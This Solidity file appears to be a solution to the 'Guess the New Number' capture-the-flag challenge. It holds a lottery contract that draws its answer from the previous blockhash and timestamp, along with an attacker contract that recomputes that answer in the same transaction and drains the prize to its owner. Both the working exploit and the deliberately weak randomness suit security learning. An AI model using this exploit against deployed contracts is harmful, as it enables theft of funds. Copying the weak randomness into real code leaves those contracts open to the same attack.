pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract GuessTheNewNumberChallengeAttacker {
    address private owner;

    GuessTheNewNumberChallenge target;

    function GuessTheNewNumberChallengeAttacker(address _target) public payable {
        owner = msg.sender;
        target = GuessTheNewNumberChallenge(_target);
    }

    function attack() public payable {
        require(msg.sender == owner);
        require(msg.value == 1 ether);
        
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        
        target.guess.value(1 ether)(answer);

        if (!target.isComplete()) {
            revert();
        }

        owner.transfer(address(this).balance);
    }

    function() public payable {}
} 